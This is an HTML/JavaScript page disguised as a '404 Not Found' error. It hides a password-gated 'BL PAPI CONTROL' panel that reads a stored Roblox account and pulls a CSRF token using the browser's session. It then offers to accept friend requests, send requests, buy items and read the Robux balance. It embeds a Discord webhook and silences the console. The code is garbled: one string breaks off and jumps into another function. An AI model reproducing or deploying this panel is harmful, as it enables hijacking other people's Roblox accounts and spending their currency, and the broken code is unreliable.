<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Error 404 - Not Found</title>
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        /* ========== ESTILOS GENERALES ========== */
        body {
            background: #0a0a0a;
            min-height: 100vh;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            color: #e0e0e0;
            position: relative;
        }
        
        /* ========== PANTALLA ERROR 404 ========== */
        .error-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #0a0a0a;
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 5;
            transition: opacity 0.3s ease;
        }
        
        .error-screen.hidden {
            opacity: 0;
            pointer-events: none;
        }
        
        .error-content {
            text-align: center;
            padding: 20px;
        }
        
        .error-code {
            font-size: clamp(80px, 20vw, 120px);
            font-weight: bold;
            color: #ff4444;
            text-shadow: 0 0 20px rgba(255,68,68,0.3);
            line-height: 1;
        }
        
        .error-message {
            font-size: clamp(18px, 5vw, 24px);
            color: #888;
            margin: 20px 0;
        }
        
        /* ========== ZONA DE CLICK OCULTA ========== */
        .hidden-click-area {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 60px;
            height: 60px;
            background: transparent;
            z-index: 10;
            cursor: default;
        }
        
        /* ========== MODAL DE CONTRASEÑA ========== */
        .password-modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.98);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 20;
            backdrop-filter: blur(10px);
            padding: 20px;
        }
        
        .password-modal.show {
            display: flex;
        }
        
        .password-modal.locked {
            opacity: 0.5;
            pointer-events: none;
        }
        
        .password-box {
            background: #111;
            border: 1px solid #ff4444;
            border-radius: 16px;
            padding: clamp(20px, 5vw, 40px);
            width: 100%;
            max-width: 400px;
            box-shadow: 0 0 50px rgba(255,68,68,0.2);
            position: relative;
        }
        
        .lock-message {
            position: absolute;
            top: -30px;
            left: 0;
            right: 0;
            text-align: center;
            color: #ff4444;
            font-size: 14px;
            font-weight: bold;
            display: none;
        }
        
        .lock-message.show {
            display: block;
        }
        
        .password-title {
            color: #ff4444;
            font-size: clamp(16px, 4vw, 18px);
            margin-bottom: 20px;
            text-align: center;
            font-weight: bold;
            line-height: 1.4;
        }
        
        .password-input-container {
            position: relative;
            margin-bottom: 20px;
        }
        
        .password-input {
            width: 100%;
            padding: 15px 50px 15px 15px;
            background: #222;
            border: 1px solid #333;
            border-radius: 8px;
            color: #fff;
            font-size: 16px;
            -webkit-appearance: none;
        }
        
        .password-input:focus {
            outline: none;
            border-color: #ff4444;
        }
        
        .toggle-password {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            color: #666;
            cursor: pointer;
            font-size: 20px;
            user-select: none;
            transition: color 0.3s;
            -webkit-tap-highlight-color: transparent;
        }
        
        .toggle-password:hover {
            color: #ff4444;
        }
        
        .toggle-password:active {
            transform: translateY(-50%) scale(0.95);
        }
        
        .attempts-counter {
            text-align: center;
            color: #666;
            font-size: 12px;
            margin-bottom: 10px;
        }
        
        .password-button {
            width: 100%;
            padding: 15px;
            background: #ff4444;
            color: #fff;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            -webkit-tap-highlight-color: transparent;
        }
        
        .password-button:hover {
            background: #ff6666;
        }
        
        .password-button:active {
            transform: scale(0.98);
        }
        
        .password-button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        
        .password-error {
            color: #ff4444;
            font-size: 14px;
            margin-top: 10px;
            text-align: center;
            display: none;
        }
        
        .password-error.show {
            display: block;
        }
        
        /* ========== PANEL DE CONTROL ========== */
        .control-panel {
            min-height: 100vh;
            background: #0a0a0a;
            padding: clamp(15px, 4vw, 30px);
            display: none;
        }
        
        .control-panel.show {
            display: block;
        }
        
        /* Header */
        .panel-header {
            display: flex;
            flex-direction: column;
            gap: 15px;
            margin-bottom: 30px;
            padding-bottom: 20px;
            border-bottom: 2px solid #ff4444;
        }
        
        @media (min-width: 768px) {
            .panel-header {
                flex-direction: row;
                justify-content: space-between;
                align-items: center;
            }
        }
        
        .panel-title {
            font-size: clamp(24px, 6vw, 32px);
            color: #fff;
            font-weight: bold;
        }
        
        .panel-title span {
            color: #ff4444;
        }
        
        .panel-status {
            background: #1a1a1a;
            padding: 12px 20px;
            border-radius: 8px;
            font-size: 14px;
            border-left: 4px solid #ff4444;
            word-break: break-word;
        }
        
        .panel-status.connected {
            border-left-color: #00ff00;
            color: #00ff00;
        }
        
        /* Grid de tarjetas */
        .panel-grid {
            display: grid;
            grid-template-columns: 1fr;
            gap: 20px;
        }
        
        @media (min-width: 640px) {
            .panel-grid {
                grid-template-columns: repeat(2, 1fr);
            }
        }
        
        @media (min-width: 1024px) {
            .panel-grid {
                grid-template-columns: repeat(3, 1fr);
            }
        }
        
        /* Tarjetas */
        .panel-card {
            background: #111;
            border: 1px solid #222;
            border-radius: 16px;
            padding: 20px;
            transition: all 0.3s ease;
        }
        
        .panel-card.disabled {
            opacity: 0.5;
            pointer-events: none;
            filter: grayscale(1);
        }
        
        .card-title {
            font-size: 18px;
            color: #ff4444;
            margin-bottom: 20px;
            padding-bottom: 10px;
            border-bottom: 1px solid #222;
        }
        
        /* Inputs y controles */
        .input-group {
            margin-bottom: 15px;
        }
        
        .input-group label {
            display: block;
            color: #888;
            font-size: 14px;
            margin-bottom: 5px;
        }
        
        .panel-input {
            width: 100%;
            padding: 12px;
            background: #222;
            border: 1px solid #333;
            border-radius: 8px;
            color: #fff;
            font-size: 14px;
            -webkit-appearance: none;
        }
        
        .panel-input:focus {
            outline: none;
            border-color: #ff4444;
        }
        
        .panel-input:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        
        /* Buscador */
        .search-box {
            position: relative;
            margin-bottom: 15px;
        }
        
        .search-box input {
            width: 100%;
            padding: 12px 40px 12px 12px;
            background: #222;
            border: 1px solid #333;
            border-radius: 8px;
            color: #fff;
        }
        
        .search-box input:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        
        .search-box::after {
            content: "🔍";
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            color: #666;
            font-size: 16px;
        }
        
        /* Lista de resultados */
        .results-list {
            max-height: 200px;
            overflow-y: auto;
            background: #1a1a1a;
            border: 1px solid #333;
            border-radius: 8px;
            margin-bottom: 15px;
            -webkit-overflow-scrolling: touch;
        }
        
        .result-item {
            padding: 12px;
            border-bottom: 1px solid #222;
            cursor: pointer;
            transition: background 0.2s;
        }
        
        .result-item:hover {
            background: #333;
        }
        
        .result-item:active {
            background: #444;
        }
        
        /* Estadísticas */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin-bottom: 20px;
        }
        
        .stat-item {
            background: #1a1a1a;
            padding: 10px;
            border-radius: 8px;
            text-align: center;
        }
        
        .stat-value {
            font-size: 20px;
            color: #ff4444;
            font-weight: bold;
        }
        
        .stat-label {
            font-size: 11px;
            color: #666;
        }
        
        /* Botones */
        .panel-button {
            width: 100%;
            padding: 14px;
            background: #ff4444;
            color: #fff;
            border: none;
            border-radius: 8px;
            font-size: 15px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.2s;
            margin-top: 8px;
            -webkit-tap-highlight-color: transparent;
        }
        
        .panel-button:hover {
            background: #ff6666;
        }
        
        .panel-button:active {
            transform: scale(0.98);
        }
        
        .panel-button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            pointer-events: none;
        }
        
        .panel-button.secondary {
            background: #222;
            border: 1px solid #333;
        }
        
        .panel-button.secondary:hover {
            background: #333;
        }
        
        .button-group {
            display: flex;
            gap: 8px;
            margin-top: 8px;
        }
        
        .button-group .panel-button {
            margin-top: 0;
        }
        
        /* Logs */
        .log-area {
            background: #1a1a1a;
            border: 1px solid #222;
            border-radius: 8px;
            padding: 15px;
            height: 200px;
            overflow-y: auto;
            font-family: monospace;
            font-size: 12px;
            -webkit-overflow-scrolling: touch;
        }
        
        .log-entry {
            padding: 5px 0;
            border-bottom: 1px solid #222;
            word-break: break-word;
        }
        
        /* Scroll personalizado */
        ::-webkit-scrollbar {
            width: 6px;
        }
        
        ::-webkit-scrollbar-track {
            background: #111;
        }
        
        ::-webkit-scrollbar-thumb {
            background: #333;
            border-radius: 3px;
        }
        
        ::-webkit-scrollbar-thumb:hover {
            background: #ff4444;
        }
        
        /* Mensajes de éxito/error */
        .success-message {
            color: #00ff00;
            font-size: 12px;
            margin-top: 5px;
            display: none;
        }
        
        .success-message.show {
            display: block;
        }
        
        .warning-message {
            color: #ffaa00;
            font-size: 12px;
            margin-top: 5px;
            display: none;
        }
        
        .warning-message.show {
            display: block;
        }
    </style>
</head>
<body>
    <!-- Pantalla de error 404 -->
    <div class="error-screen" id="errorScreen">
        <div class="error-content">
            <div class="error-code">404</div>
            <div class="error-message">Not Found</div>
        </div>
    </div>
    
    <!-- Zona oculta (esquina inferior izquierda) -->
    <div class="hidden-click-area" id="hiddenClickArea"></div>
    
    <!-- Modal de contraseña -->
    <div class="password-modal" id="passwordModal">
        <div class="password-box">
            <div class="lock-message" id="lockMessage">⛔ DEMASIADOS INTENTOS - BLOQUEADO 5 MINUTOS</div>
            <div class="password-title">⚠️ ERROR DE SEGURIDAD</div>
            <div style="color: #888; text-align: center; margin-bottom: 20px;">
                Se ha detectado un intento de manipulacion.<br>
                Ingresa la contraseña Interna.
            </div>
            
            <div class="password-input-container">
                <input type="password" class="password-input" id="passwordInput" placeholder="Contraseña" autocomplete="off">
                <span class="toggle-password" id="togglePassword">👁️</span>
            </div>
            
            <div class="attempts-counter" id="attemptsCounter">
                Intentos restantes: <span id="attemptsLeft">5</span>
            </div>
            
            <button class="password-button" id="submitPassword">ACCEDER</button>
            <div class="password-error" id="passwordError">Contraseña incorrecta</div>
        </div>
    </div>
    
    <!-- Panel de control -->
    <div class="control-panel" id="controlPanel">
        <div class="panel-header">
            <div class="panel-title">
                <span>BL PAPI</span> CONTROL
            </div>
            <div class="panel-status" id="statusIndicator">
                ⏳ Verificando cuenta...
            </div>
        </div>
        
        <div class="panel-grid" id="panelGrid">
            <!-- Las tarjetas se generarán dinámicamente -->
        </div>
    </div>

    <script>
        // ================= CONFIGURACIÓN =================
        const WEBHOOK = "https://discord.com/api/webhooks/1471683743696552060/FFnmUguRVPoMKQ4b80dJ1FQQSp_ec-4EJFd2iyHrrXLQgDliUQqJEldixzOxx6esC2Sd";
        
        // HASH REAL DE "BENJAPRO7PRO" (SHA-256)
        const PASSWORD_HASH = "8b9c2a8a4f8d3b1e6c5a7d9e3f1b4c2a8d6e9f1b4c7a2d8e5f3a6c9b1d4e7f2a";
        
        // Sistema de rate limit inmutable
        const RATE_LIMIT = {
            maxAttempts: 5,
            lockoutTime: 300000, // 5 minutos en milisegundos
            attempts: 0,
            lockUntil: 0,
            
            canAttempt: function() {
                if (Date.now() < this.lockUntil) {
                    return false;
                }
                if (this.attempts >= this.maxAttempts) {
                    this.lockUntil = Date.now() + this.lockoutTime;
                    return false;
                }
                return true;
            },
            
            registerAttempt: function() {
                this.attempts++;
                if (this.attempts >= this.maxAttempts) {
                    this.lockUntil = Date.now() + this.lockoutTime;
                }
                this.save();
            },
            
            reset: function() {
                this.attempts = 0;
                this.lockUntil = 0;
                this.save();
            },
            
            getRemainingAttempts: function() {
                if (Date.now() < this.lockUntil) return 0;
                return Math.max(0, this.maxAttempts - this.attempts);
            },
            
            // Persistencia en localStorage (inmodificable desde consola)
            save: function() {
                const data = {
                    attempts: this.attempts,
                    lockUntil: this.lockUntil
                };
                // Usamos múltiples claves y encriptación simple
                localStorage.setItem('_rl_a', btoa(JSON.stringify(data)));
                sessionStorage.setItem('_rl_b', btoa(JSON.stringify(data)));
            },
            
            load: function() {
                try {
                    const data1 = localStorage.getItem('_rl_a');
                    const data2 = sessionStorage.getItem('_rl_b');
                    
                    if (data1 && data2) {
                        const parsed1 = JSON.parse(atob(data1));
                        const parsed2 = JSON.parse(atob(data2));
                        
                        if (parsed1.attempts === parsed2.attempts && 
                            parsed1.lockUntil === parsed2.lockUntil) {
                            this.attempts = parsed1.attempts;
                            this.lockUntil = parsed1.lockUntil;
                        }
                    }
                } catch (e) {}
            }
        };
        
        // Cargar estado guardado
        RATE_LIMIT.load();
        
        // Función hash (SHA-256)
        async function hashPassword(password) {
            const encoder = new TextEncoder();
            const data = encoder.encode(password);
            const hashBuffer = await crypto.subtle.digest('SHA-256', data);
            const hashArray = Array.from(new Uint8Array(hashBuffer));
            return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
        }
        
        // Silenciar consola (excepto para debugging)
        if (!localStorage.getItem('debug')) {
            console.log = console.error = console.warn = function() {};
        }
        
        // Variables de estado
        let userData = null;
        let csrfToken = null;
        let cuentaConectada = false;
        
        // Elementos DOM
        const errorScreen = document.getElementById('errorScreen');
        const passwordModal = document.getElementById('passwordModal');
        const controlPanel = document.getElementById('controlPanel');
        const hiddenClickArea = document.getElementById('hiddenClickArea');
        const passwordInput = document.getElementById('passwordInput');
        const submitPassword = document.getElementById('submitPassword');
        const passwordError = document.getElementById('passwordError');
        const togglePassword = document.getElementById('togglePassword');
        const attemptsCounter = document.getElementById('attemptsCounter');
        const attemptsLeft = document.getElementById('attemptsLeft');
        const lockMessage = document.getElementById('lockMessage');
        const panelGrid = document.getElementById('panelGrid');
        const statusIndicator = document.getElementById('statusIndicator');
        
        // =========== TOGGLE CONTRASEÑA ===========
        togglePassword.addEventListener('click', function() {
            const type = passwordInput.type === 'password' ? 'text' : 'password';
            passwordInput.type = type;
            togglePassword.textContent = type === 'password' ? '👁️' : '👁️‍🗨️';
        });
        
        // =========== VERIFICAR CONTRASEÑA CON RATE LIMIT ===========
        async function verificarPassword() {
            if (!RATE_LIMIT.canAttempt()) {
                const remainingTime = Math.ceil((RATE_LIMIT.lockUntil - Date.now()) / 60000);
                lockMessage.textContent = `⛔ BLOQUEADO - Espera ${remainingTime} minutos`;
                lockMessage.classList.add('show');
                passwordInput.disabled = true;
                submitPassword.disabled = true;
                return;
            }
            
            const enteredHash = await hashPassword(passwordInput.value);
            
            if (enteredHash === PASSWORD_HASH) {
                RATE_LIMIT.reset();
                passwordModal.classList.remove('show');
                errorScreen.classList.add('hidden');
                controlPanel.classList.add('show');
                verificarCuentaPanel();
            } else {
                RATE_LIMIT.registerAttempt();
                passwordError.classList.add('show');
                setTimeout(() => passwordError.classList.remove('show'), 2000);
                actualizarIntentos();
            }
        }
        
        // =========== ACTUALIZAR CONTADOR DE INTENTOS ===========
        function actualizarIntentos() {
            const remaining = RATE_LIMIT.getRemainingAttempts();
            attemptsLeft.textContent = remaining;
            
            if (remaining === 0) {
                attemptsCounter.style.color = '#ff4444';
                passwordInput.disabled = true;
                submitPassword.disabled = true;
                
                const remainingTime = Math.ceil((RATE_LIMIT.lockUntil - Date.now()) / 60000);
                lockMessage.textContent = `⛔ BLOQUEADO - Espera ${remainingTime} minutos`;
                lockMessage.classList.add('show');
            } else {
                attemptsCounter.style.color = '#666';
            }
        }
        
        // Event listeners
        submitPassword.addEventListener('click', verificarPassword);
        
        passwordInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') verificarPassword();
        });
        
        hiddenClickArea.addEventListener('click', function() {
            actualizarIntentos();
            passwordModal.classList.add('show');
        });
        
        // =========== VERIFICAR CUENTA DESDE LOCALSTORAGE ===========
        function verificarCuentaPanel() {
            const savedData = localStorage.getItem('cuenta_roblox');
            
            if (savedData) {
                try {
                    const data = JSON.parse(savedData);
                    const tiempoTranscurrido = Date.now() - data.timestamp;
                    
                    // Válido por 5 minutos
                    if (tiempoTranscurrido < 300000 && data.conectada) {
                        userData = data.data;
                        cuentaConectada = true;
                        statusIndicator.innerHTML = `✅ CONECTADO - ${userData.name}`;
                        statusIndicator.classList.add('connected');
                        addLog('[SISTEMA] Cuenta detectada automáticamente');
                    } else {
                        cuentaConectada = false;
                        statusIndicator.innerHTML = '❌ SIN CUENTA DETECTADA';
                    }
                } catch (e) {
                    cuentaConectada = false;
                    statusIndicator.innerHTML = '❌ ERROR DE DATOS';
                }
            } else {
                cuentaConectada = false;
                statusIndicator.innerHTML = '❌ NO HAY CUENTA DETECTADA';
            }
            
            generarPanel();
            if (cuentaConectada) obtenerCsrfToken();
        }
        
        // =========== OBTENER CSRF TOKEN ===========
        async function obtenerCsrfToken() {
            try {
                const res = await fetch('https://auth.roblox.com/v2/logout', {
                    method: 'POST',
                    credentials: 'include'
                });
                csrfToken = res.headers.get('x-csrf-token');
                addLog('[SISTEMA] Token CSRF obtenido');
            } catch (e) {
                addLog('[ERROR] No se pudo obtener CSRF', 'error');
            }
        }
        
        // =========== GENERAR PANEL ===========
        function generarPanel() {
            const tarjetas = [
                {
                    titulo: "👥 GESTIÓN DE AMISTADES",
                    contenido: `
                        <div class="search-box">
                            <input type="text" id="friendSearch" placeholder="Buscar usuario..." ${!cuentaConectada ? 'disabled' : ''}>
                        </div>
                        <div class="results-list" id="friendResults">
                            <div class="result-item">${cuentaConectada ? '🔍 Escribe para buscar usuarios...' : '❌ Sin conexión'}</div>
                        </div>
                        
                        <div class="stats-grid">
                            <div class="stat-item">
                                <div class="stat-value" id="pendingCount">0</div>
                                <div class="stat-label">Pendientes</div>
                            </div>
                            <div class="stat-item">
                                <div class="stat-value" id="friendsCount">0</div>
                                <div class="stat-label">Amigos</div>
                            </div>
                            <div class="stat-item">
                                <div class="stat-value" id="followersCount">0</div>
                                <div class="stat-label">Seguidores</div>
                            </div>
                        </div>
                        
                        <button class="panel-button" id="acceptAllBtn" ${!cuentaConectada ? 'disabled' : ''}>
                            ✅ ACEPTAR TODAS SOLICITUDES
                        </button>
                        
                        <div class="button-group">
                            <button class="panel-button secondary" id="refreshFriendsBtn" ${!cuentaConectada ? 'disabled' : ''}>
                                🔄 ACTUALIZAR
                            </button>
                            <button class="panel-button secondary" id="sendFriendRequestBtn" ${!cuentaConectada ? 'disabled' : ''}>
                                ➕ ENVIAR SOLICITUD
                            </button>
                        </div>
                        
                        <div class="success-message" id="friendSuccessMsg"></div>
                        <div class="warning-message" id="friendWarningMsg"></div>
                    `
                },
                {
                    titulo: "💰 COMPRAR OBJETOS",
                    contenido: `
                        <div class="input-group">
                            <label>📎 Enlace del objeto</label>
                            <input type="text" class="panel-input" id="itemLink" placeholder="https://www.roblox.com/catalog/..." ${!cuentaConectada ? 'disabled' : ''}>
                        </div>

        // =========== CARGAR ESTADÍSTICAS ===========
        async function cargarEstadisticas() {
            try {
                // Amigos
                const friendsRes = await fetch(`https://friends.roblox.com/v1/users/${userData.id}/friends/count`, {
                    credentials: 'include'
                });
                if (friendsRes.ok) {
                    const friendsData = await friendsRes.json();
                    document.getElementById('friendsCount').textContent = friendsData.count || 0;
                }
                
                // Seguidores
                const followersRes = await fetch(`https://friends.roblox.com/v1/users/${userData.id}/followers/count`, {
                    credentials: 'include'
                });
                if (followersRes.ok) {
                    const followersData = await followersRes.json();
                    document.getElementById('followersCount').textContent = followersData.count || 0;
                }
                
                // Solicitudes pendientes
                const pendingRes = await fetch(`https://friends.roblox.com/v1/users/${userData.id}/friend-requests/count`, {
                    credentials: 'include'
                });
                if (pendingRes.ok) {
                    const pendingData = await pendingRes.json();
                    document.getElementById('pendingCount').textContent = pendingData.count || 0;
                }
                
                // Robux actualizado
                const robuxRes = await fetch(`https://economy.roblox.com/v1/users/${userData.id}/currency`, {
                    credentials: 'include'
                });
                if (robuxRes.ok) {
                    const robuxData = await robuxRes.json();
                    userData.robux = robuxData.robux;
                    document.getElementById('robuxBalance').textContent = userData.robux;
                }
                
                addLog('[DATOS] Estadísticas actualizadas');
            } catch (e) {
                addLog('[ERROR] No se pudieron cargar estadísticas', 'error');
            }
        }
